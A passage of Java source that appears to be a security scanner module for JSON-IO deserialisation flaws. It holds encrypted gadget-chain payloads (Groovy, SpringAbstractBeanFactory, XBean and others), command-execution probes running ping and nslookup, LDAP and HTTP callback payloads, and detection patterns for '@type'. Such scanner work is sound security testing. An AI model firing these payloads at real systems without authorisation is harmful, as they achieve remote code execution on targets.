+pC0qq3QIo9hV/ywk+YFKaH/NEv2CFrjF5N+SCdY1nDwON62XhpSQU4stFvqRpwctYwCs5lRGhrpstmpDBOfnFc6O0XXzTAjOs3DqHtz9PiXPYtign9/CxI5b50p2OE8QaXewdaxj5njPye0mzmpGgMuWikiQQWQZnjQuQIcw5peRc0ijnaw80NdSAzlkk8xbruaBvH8cLnQgyXyMh83h9IPA2fa/1jeurOArPNPOsd5YdvlEA0nSyb71KkLems0gAqB");

    //SpringAbstractBeanFactory payload data
    private final String SABF_PREFIX = decrypt("YoJ/fwsSOW+dKdjhPEGl3qzRLESlmQVMRDZpTmecMYBR2j1pUj43DjPWjACYzxY2jJfX3kDPMSwMr9jjvhB8EGq/Y9/dzhjuIfItJ0jjkFtHHPcPhPQKpkLJZyok7PU66vwWFpbgNqeWIdTyRwjpzCdFyx7j5lkuUX1KucKt/x8kbs3u+HtPb87+oMkmylzgCuCBEgw4kYWGWXXigFTDzmq/Y9/dzhjuIfItJ0jjkFuA5BOGaFwM1ZT05WcqJ7/BgLQid/KoOJ2OVtyzd8n0qohEb3uHREYppRzTz/Ae0ybRfck5Axf5vHabNmSP+1+wbrS5ASDRo54bGvWvtFGh3G3n8vKYyyLFjBsz+X5Ipy29BZzxP3SWaeH1Ww+zDokXvGCzGs2OLYMZuyaIa5Ct2fm3Wth4hbgkVpl/V0HTRAcnCzyg4Ifm7VdArmoEw1ttn4V135nE/L2ofCv7NiANHi/q1IkvPNLxzk3GtonPC2OdVgXLKw2WrPSY3yhxjrrEOLEGsQFOg9U4mRzxL3TH1u9phCAhfjefQBNSAw+ngOiJrlLxLok3nvrgahGowGCDeLtzv4kmf4oMGHt4dhbE7Ff389tLZR87nW35+1qEqPbXRnKYhGZ4wTYVujzPXMiVSLgp63ykEaSiwI3piOtp5Hqy4nrDB31kTaOHk3ktTcvkd+bqba/gXkLH/JiNsMR7/DBuMTwU6r9uPKsNwucTdMSAALnUKhZLmnOt0Ao2Eqd2I0fLUPD/Z+u7uxDGtT3fadzHmEq/CP/uIGPRcQF/Hdxb6a+gUso5HUqxgWHZ1ubrxUOB3bdXOPTE40PJWGTpfrwrSSvbRnVzKpfNMCYg/lL55dk/+Gc6sg8V/tT2FAQIyGbhWLS1mlwyB+sMCV+qMaWTMiGs7gg59RdraPxh34V1m8CvIkv66ySokCfRFexGtn6vMT1hdXCNFqOz6DdNANlzCxoT9hfGP3vl0canWEK714dlyh6TaJc/8yhbHD/OQlGzXThKrRTMYi3iLwFbzzGyR85ssjOMbH+9Q0JNb9AncHh0SRHmHOFVzpHM0PooHHa7q56wwlw/ouf08EJqhnLIQhNIn+27F6qD3e2S5mzLZyYPAVy56SD91ixEu12kau14nJgmw/a7qxCMVTAyjM2PCOgBvsOHhvuLTEGZe27xff4wpwS/vtuNaCMHZ/HDp48Bnyl5E9wit6coEGv1XwsNiwlmLVvBOhTOCDQF+dUa1FmNSD7tgvRa7Fz+dKyueGWp1eNZVdfGGNdi35QCL1PTuNv6dsftpCRYg45oaTVI1hYaDbjrETtqe0tfxJKVOZFFOMmUsRBbW0K1sGTIf0T+fbO3h2lG3KtCk9nJdpEnP27t4ZrYqyoQ3qh69iqt2mUZ8PZkLHCKSEt7RHTv+dlmZBjcSSkNettJvhusYRZYMRHZ7nSKsAmocNy3wQ19VAIfZW/dt8vWYkd11UlvJ6CQ4xDcsaP6TbfFxvrDC4DDNnxncCvsu0iiglCeT2h963/GZLS8Xj2CQSH1VEQfKmd4lROYwyh6lgLG+0/zVhB39y5t7khKUG47Ric139I2+bAfNv9HPK24/is98jkKoMF3yDG3DSPRL83jQ+tksQyIT7miPBCrLuwuCa+AkKAfoiOjATxjgzQLvkBpsYZgj5fhFqQvSrCRC+LikCsA4VjRVA6jArAV45qaSXJNDnPwcAb/YG3BYTokP5zQl3gqZimNRPZgZS/H52M2A4ftWs7bfsVztDeHpkZ1LrBhdUYhKCToFtv+6wk54oWiGWpLec1c/CWXLJqJqYL2P0SuK/W1U3nlf+XLpha3/m+ribB3wSfkoiyEgzY+SeID2HiJuPcaULAywO7+1xeYkI57tu/X57RNe8GBwH5FFpnps+U03X7YLXhzuROnKPQMN8Ue9EoFBf0zp2oGCqgHsqZknRKj7yy3Gj52pKpJlVFadm1edmBPEl7HpG+cWdL+XtcvG+CKtjij1RaYsFixJRxH7mKCf38LEjlvnSnY4TxBpd47t9nOm6QfW74VAa4wibjQX95QIK1gsxnq393jlxpr14OEuZBAl7IVBo+SO5cZTFa25p6rNBU6cdhJFB7hb0dtSx9oNQvT0H160z9/859IZ+jnLm/N9UEjlGvYPaDMouSuYplynZwkh5+VSDhMcVh8x+JrqTateo9f+1jcv6NW4p4QTyfK25+Sfo8k7gBoZvzM/4iQKq/xAExLIC3nD+D65Ub+zoxa2dC1BWH2STl4YN3D923TbTWHNyLS0r87yaxxkw/5lbbUX9I8LQsoRodQjn/ORBD73VEqXU9N26xeC8QTI2ff0aAKKv2ZuQ5E935ZrfT0Y/xdpjFRHYxCQedNf8635gTVbvU75fko+LBZ0mK7pxa6Xxu3jmf3ETkvRSlrG09sRxVkSJUECFiqehRfhkXGAbPJo5VDAhcuAmWDMY88T32UMSC0tCM3XeCEGkMXqkwQIsw/WuL2Q+VDpYYMCPD7XG9ps3zj0qGVzVRN46vEjpRVoVQ65powDbQJ/cNdIeS1vKdQh2CNuWDQODrfODRHEkibeZDIDalTvKUQiUTPHEPzfuR6eyRojlj0GMBign9/CxI5b50p2OE8QaXekwZKZzxthwWsyIucPCgv5U66JssrzztYga/Ri0NFMPOXco7nZWW8qsWmuDjmcxh842IGH1jhvDrFVoGJjoT+LOPOAOijfFC+W6BEtPgY80FjfDztpve0mzaf+CxgZustk6BpEE8p0UF5tPGT/eUkN++5lmCvRvzdK9PoeCkx8Djgra3ht6KaKuZwo+r1hk7PN4GdNSNhLgh/LiDlBJH6chg2Ezi37/h85x0ZXB0F/quvU6gwQK0vioePGHaqq5Y7OsA2sX2zfFf1hvHd4ZDeitixTm7YNUlMAhf3TfWkzXyqLerNWTE1KTLAulEI58OQTYmkpjWeSp6oxH2UbmFfyk1Ci61mPgcMU+Ea3DtRvKeREiTJDBHyl4d7vYO8p9ApylxZbXSdEIfoXcYdL+bKo/VOS9FX66mm4EzwvlgjfJoj7LRbq4UEpDv/T/G0IfjCmYN1D7m/c8nqrstzQMSUMMxMZnnItElUV+uspjV62VV2w1YHW1eb6nTQcUjrPHjp9RyxEJ0/+0P/TkibO9n5JTDhbuvSUBjQz/6A8mhFwXimuBWv/QiwZUwdYve1iun3cZMP+ZW21F/SPC0LKEaHUNBkwDq7WSuQkrzraEohHSTtfSFUBmcJV0KVYdaspV89qC6fbKrIl6TnTykKDZt/4xkZp400bhCHyAkNyTtZb81QGwKQATQIvng5KjKcoFyHEHvNx9pBuCCoNf0bl3X0F88KSNBpo+kf4Nz4BrVEHA7TpPoKB6cDNksx4MyWvfLDlyvDGmW7Q3O6KG6G7TsdDTBj2P/OKnTRa+NKc9ckcUPehth1sV3xz4BPQTQzx1dP02Jb5shB6jU8yIftRHO1DEi4Ket8pBGkosCN6YjraeR6suJ6wwd9ZE2jh5N5LU3LcWaTocsHANhF4gHgn0xgX+DO3GQuSzeUnLKn5HXaXFnTMm6Md2NVkfZb1CGpIbHtnZ9c1b+Roh/lur6uTPe9OhplL6Pg1CdOFrBnf0WN9Ska/N0ZrT9TUTLIYhR0/ZDPRpcmmLW+5kwWlh9QvTpNtIl7pOFezxiCPZKEzxWMqbBg+aDQnfMsRPwgXKbtlb860d2rjxqQFyXgoZ3BWM4azSdBdTFFEJNsYXBu99gWJ4FUZv3PeIRqpufbbgSVxhbFGoJnF6TRZltMrvATTe1EPkTqOjSi8663wO0IvPAcsylChUTdYZfghyZHRbDy/tkqjlceSEzzDknPvVsihoVOhjGgk3+Ylx3d3acpDRPHiWsoBvpGGuR16k1TIhquArXYi/MkZu11c494XxGGRUUU/OwWa0L3SgMoqtFltd/XfN8ov+dvZVDcQ3JLM/avhajV53/e/9ia8SOhr7draLN4pU8SvVx8EaX1gwZdDJKD5HlYDiIEtsTqTySVd7+IpU+oayPrbUcI/EM3e8zN96OQaRiJBINZcULPL4v66XzKpw/39IkdXSnhF0ehHpIX3+iBeN8MueWwqAA53DxxUwIfCW/zzuDkk7ZuCVAGj+ZoEma4ru0WYQAkz1gujLA4lg8bOtP4xcGiK3+ShGKXKdLXB0CSSGyv7I6qsh+Qpo/nT8ZuWwz0A3m+84U0Y7ET7UFdjZOC81Weh4/i1kQF03+pnRmUVo5eRMTQUQDBCIE2DFWC4mC6epKEGnYD7YL/3zO55blfNIFFZ3jv52OGhxGU6okMZh2xdWdbjaivg8h6Qvwm4zpiAL3yPKu84Bl7umdU6GiHKPk0bpbG4i1trhWynRcynVzBHr2akhmxdwQEjwODLPzXriUkTBT+iH7e94YplFgmAgaiH+9sR8gerfuKljWEiHVBpA19nnF7nXQQpTTTAXJKAbV36IsVoLvZAK26j+e7LlK7Bso+fj6mjwD8xl404WuQoZdhvu8UD/ddyuc6NW5a0qc/jXsr0ULVnVmWLU8EdDPd5IUmKntHwxwiofk+WOu+15fECRSuOBsPSzm5qLX7CfM4a+uJejNbRtXt2NsFlUz9Dek7L16kTCtZqm3n8vKYyyLFjBsz+X5Ipy3jof8ixgezXzHeY9UlgBFSDxCoaBOxCF01m69VWzY92j17XMsczRNJOdIooBgtKZQp9dZlRv7+nAzmFyc3LIkTdIJ8JW6npju9S3mG7+8j00Pf1b/H6DGksGb0riS4ElkSZhTFdfsJEVAXR6E7cUbn/oGCTJHfhABslZizeTQn2pDyM7sFe5qXke3bMvF2TGlign9/CxI5b50p2OE8QaXeppTBwsTPo0yPJRT326QXMp1NtOpceP4GON0vGhtHJ5wGhKRkNR7sMHhUYDM4gDp34ncfA1rtTmKnL+G/vT8GEF7bDorFNEALsAOk3QCjUNs3/zSDi299sTwH67zVL+eeauOZIYCE/LmKjp+iyYoFczT2Z6FIxMweAtP2roospjvZMrOris/4Oyp2stw2tJI+kL6tI7/vsxYhpQPznWY3m0ZqHX3Nry+nInfxBvfLfBJ3SARmsGk2xF7WZ+OFz+Emr7eslAoVFl4NidDd9yEthL5/oEkUhGX0R992CIsuGPcPjuRDvOkRqqrp4NADf1+vGVE5WPLjzKWQCwu4I0K0WQ3I+YsAXff954cdss/AKLKScgccSMYGMJeWg7WNnHJKB5E606tCjsLVxgiHlcrFTFkUmZqrur9lpr8JgS/tyAV7hK9sYysZDdyomwUdrA01njhLUUf1GsWp0WG6XVv6V+skZ8gsz/Gjuf/XPmOmKHKBakt1oDGePGw5eFilI0+aV8Rna1VgOQLZbdQst1Pt4loYovk47F9jXFnL4km6D3C+6ezf4GLXAg5hUXD6U86o4OaHb3Dka0TU/kqVjzvc7Na/lFxRYyhtwvhbUoY9reCEwLlZz0/iHrxqknTpQ1tZ+7nqQIwNP+VSVbQwBHW0IcyZd5LMcx0+KnbB1vNsOrGM9fUxv4GWA3YL9GPv3x7badzHmEq/CP/uIGPRcQF/HVMgn+Bk4DYfNA2t0HOdiyBjazRoAOPj52RPqDK12Ox+fSFyGY1L6Hzs1cXutpaBeUzlRwRpx2QGJKLIPfgtt7mI1xPWIUQoVEJkcnh8Ra5bqi3qzVkxNSkywLpRCOfDkGRmka7nSj0RnouAmqkrqskv2fn6gIxNU19GlWYbR31wdbuq4mplylkSrdeMEjKM9xwsHiWiidC3UgceeQcFFjLTGPnLu9v1g7ZcVa7c2ReBD39wwuzTsvidzpuF8BQppsUbEBHGd24PBfp+/8C1STE0zGgwc5YhB41GFA42r29/qmyfa0+ch6AZ7mHxM2mSJbSfjv9cifFEgvEdNkOHJABm0SNPTKj05jQg74qbiV+XGZRWjl5ExNBRAMEIgTYMVVzX0l2OW1Qt8M0LBGoffKk7Ojab7p+n8BmRku39bX2qOU1FMlDMDfqOL1K+WbhoNLVut0lBRUUq4wO1SRX0for0DAsnXqqfOJvhGIiFLGhdHqlbHO6qL2Gz9bYrxr1HZCbH+2KdvBcmWogs41BthPpxkw/5lbbUX9I8LQsoRodQXQhyV+tA8ej6cjA2MUNvM3PLWbr9HRBT7o2+8o/0YZymc6cgTxeM/8yoPeSt3g0uGHeoPcDJqRJS2upppTZdh4gfZQsaFe13OPLy9KIramztJxdgw3EGh2IDnM0ZQ4uXGp5nA2vjc8uFWAyCYmDXtwrACvchWwR06z2ZqB6UxVc=");
    private final String SABF_SUFFIX = decrypt("2EkQE6qVWt+t772E35CsdsFC9V3lEtRLo+CWboiFfTNHE7AWtx7LdNgbpmGm9JvL064ZBIyjXBDECT1i3w34VgVcxN06Dh8lwrjmWKJLGMIctMy6o/ikyybkBQO23pDbBRcV+kkp/wGy59OHCR9HtRmUVo5eRMTQUQDBCIE2DFU/EJj1YGgh1hmgTRsfWgvtZM+fIOc+m6GJHmIsVCo5QWncx5hKvwj/7iBj0XEBfx1gSek5UISsdL35QzpMrPIhSo5lCzLMR3QlsqPyPYe2HCWdfsiKprLY/5BM/2buVeRUZv3PeIRqpufbbgSVxhbF16UZ0Fbj5FijazTOXpxZgjbc5h0DZOtKVZkrBFXrtU+1R9iZyINc6qKDzN+zaiXq6BLokQEw30SetFe+/0VMKBqvE/imtCrbshr0vjznXkKwOsSW24EsfLCGN0MHKYSj9TFoebpyogE/CcQPDVZdzG62kkBn4V+X8eHMUzNbrwyFery0aH0Tb+8G7gEto6BpR+Q6exsN2PI2TP0mMyUXwmYfBdRh4/QEnIG7Yj/Fv2Xh979mKCGfR0VmV8VlomZ8jDZZnoKQ9Z50nEamLAINYO0CaVk3TMZf1+ZlQi+ZRndQGwKQATQIvng5KjKcoFyHuUNybAoZ5VzXanG7tRkkExpMPTliADxU/AZWup9cnpIcLB4loonQt1IHHnkHBRYyS9lyeJ7zUVDATtKatiue6D/Dm6oP8LjEs7qkYt2nf96+EgkKYHMxcKRvve3stvZTKiaMAGSgCUzco+82FN2FOgF7aBcs++NG34HydErLnDy87GJKDM06pa/KUTnr4VbBrIjsAxzI5rsRNn3vHW6iglWBKeWkLlSYDimb6eQECG2XXh4ZvJjlEhs/3n6K3+rmB25bad2/Yx+ZEtmFE7hEWL6LO6d88/LkWQZBecM+ADGGMiKWGNdqg+RlU04uucQ0HCweJaKJ0LdSBx55BwUWMkvZcnie81FQwE7SmrYrnug/w5uqD/C4xLO6pGLdp3/evpGLNaxNSzRsKCZXYK5a6Jx3Yl19UTBy2tIfTiF6dO9SIzh2dYS2CvlPO14y04zztgltnMh2KWO1NlLo986P6eeB5FzvmcbK5zt/xtdx5qlQ3Rruno9DgE5W+qwvoe896xKjlNVJX/o75UGa4/IzPhzu5hzBzamo7RfBRBEoUAr+1MqLHv26Vp7AOQ8DwxgmIfCZ+N1f3rG89KYw0DxLhMsLs1hHg6WSD2g4fD9qvVuF9H4TynCli1bvKL7Qfo90MW0TWnnPFLXdm/DD6GBVnODwQFo5xNyl/lbR0+i6P1L07uwcpXB2YZuYntC4WTan+xbAwABr8eVvNxgweBoUbsG427Y9rSM6aT/OEgoQJnJKbyJS02OuZBaf+D+Z6AWM");

    //XBean payload data
    private final String XBEAN_PREFIX = decrypt("YoJ/fwsSOW+dKdjhPEGl3sHWsY+Z4z8ntJs5qRoDLlouvW9s/2U5oZJ2nOYd47Tz3au5T1udmS5SyUIo/L0nrUQH/fvjLcA3ZFbQTOB3sj/7rvkVSJCOgDyJTgQ2anghyChhREYaXgWwQtCjSbRrsh+6XKmsQnYyoQCASfiapEOggDrbNFYTvXLjOZxmmOmw2sE5n73EaVBj40hA6bCRlhhWq/bLn+VlK2FDOfvBbXQ5BtC9ehTkS+RvAAi0xuD5QihathSTv+9Fr9UAgI6qSL5c1rjOw/073f+DMYDg0+WDx2v2CkphbnbqtWgkIBykJS/z2ZvBYbtZG+L0HwND39thmQvhNrtPdtS35y7Rnivwk6lWg3TP27pAQlMphElWjFuhenIY5PJaCHL8Ls31Q4zWCRdlq0ArOzdYZyMjo7blEA0nSyb71KkLems0gAqB");
    private final String XBEAN_SUFFIX = decrypt("+Y1pP61R1p+R0fymCcGcXrJKh2ITkZQTsraBKpf2hNkHu3Ju1kGJkzIUrpdbaQ14K376BkeWR4ZuOIf4whhQonc3Jq8jPxpOW77kozoM8KjJeni9nVhleBoMSM9bE1A0tNTjaMFFAxdXH0NPMSIKqgUjA1/mkYmDljthHcVkncYAQNHc9y5+FOoQpgAebTMR9kkGgCbHLgAuzRqBQ8/hPZ+W76epLAEoN0sl3OJAlPScmz2qzet+EDYqLUdu3HirD8xpEEBDKy974B2OvfRMwz4OTRrHhqNvN/hqESmybgaJ2PQGPyQZhwH5zViMBazSKXpPQSWgzg2UQIoylAcnX8BiXz2aI42S9A62/TiJkk4DTZOp+ZIkGsgBYpNoaEkCpETxxoRguV0I9Ep34I/71oxVwA79kSsSKioj1jLxk4qrvQPewiubcm2mm/ud6np1hl4gxpFmMK7IZ6cJ93aapIGu4F0xGbM7P05XvD4KOVjPeGEzg66DzPEaHlG3srxiqLUgJqhWSh66PjeEI+YekUecrKwKlU7vg+mc4p2D0GDdsPCejO7O86BmMzbPrihXaJD4vqUYSiAaca7htUL0jpDsPTpnfIQ1I8/gzPJnAm+q8brVKxMG7om7u1C3vAbYJmVEVm1sJSfl28HDLVNcLcQOcVRFMcpOG6PQZYMEYKMa/N0ZrT9TUTLIYhR0/ZDP5QPKldfsTDX3fhY3iIpWzOijG5h5PTf/7HbvwgcbJpSax3lgouu+AVysmnGMwDiZlNnpRzG+YKwEedf6GPumj57mX9jSkjRCsc5yKungAwAqXLHDoumpEyGmnBPxlt9b/yOMjo6VhJp4tQCOBukLxd+D1cFLEZaMTO4znfhPz77n1XmkVXbIxARFo7sNOq/VZN7B1dmJPKKIaX82UNIOeRhCvmpXbA11hHvQihgQuJeTXcnLmTu+DWYuHaMDx6mS5RANJ0sm+9SpC3prNIAKgQ==");

    protected void initialiseModule() {
        setName("JSON-IO");
        setPlatform(TargetPlatform.JAVA);
        setModuleIsRCECapable(true);
        setDescriptionCaveats("");
        setRemediationDetail("");
        setSeverity(SeverityRating.MEDIUM);

        registerPassiveScanIndicator(Pattern.compile("((\")|(%22))((@)|(%40))type((\")|(%22))"), IndicatorTarget.REQUEST);
        registerPassiveScanIndicator("JsonReader.readObject", IndicatorTarget.RESPONSE);

        registerActiveScanExceptionPayload("{\"@type\":\"Freddy\"}", Pattern.compile("Class instance ((')|(&#39;))Freddy((')|(&#39;)) could not be created"));

        registerActiveScanTimeBasedPayload(GROOVY_PREFIX + "\"cmd\", \"/c\", \"ping -n 21 127.0.0.1\"" + GROOVY_SUFFIX, TIME_DELAY);
        registerActiveScanTimeBasedPayload(GROOVY_PREFIX + "\"ping\", \"-c\", \"21\", \"127.0.0.1\"" + GROOVY_SUFFIX, TIME_DELAY);

        registerActiveScanCollaboratorPayload(PN_GROOVY, false);
        registerActiveScanCollaboratorPayload(PN_LAZYSEARCH, false);
        registerActiveScanCollaboratorPayload(PN_RESIN, false);
        registerActiveScanCollaboratorPayload(PN_ROME, false);
        registerActiveScanCollaboratorPayload(PN_SPRINGABF, false);
        registerActiveScanCollaboratorPayload(PN_XBEAN, false);
    }

    protected String generateCollaboratorTextPayload(String payloadName, String hostname) {
        switch (payloadName) {
            case PN_GROOVY:
                return GROOVY_PREFIX + "\"nslookup\", \"" + hostname + "\"" + GROOVY_SUFFIX;

            case PN_LAZYSEARCH:
                return LSE_PREFIX + "http://" + hostname + "/" + LSE_SUFFIX;

            case PN_RESIN:
                return RESIN_PREFIX + "http://" + hostname + "/" + RESIN_SUFFIX;

            case PN_ROME:
                return ROME_PREFIX + encodeStringAsAsciiByteValues(padString("ldap://" + hostname + "/", 200)) + ROME_SUFFIX;

            case PN_SPRINGABF:
                return SABF_PREFIX + "ldap://" + hostname + "/" + SABF_SUFFIX;

            case PN_XBEAN:
                return XBEAN_PREFIX + "http://" + hostname + "/" + XBEAN_SUFFIX;
        }
        return null;
    }
}
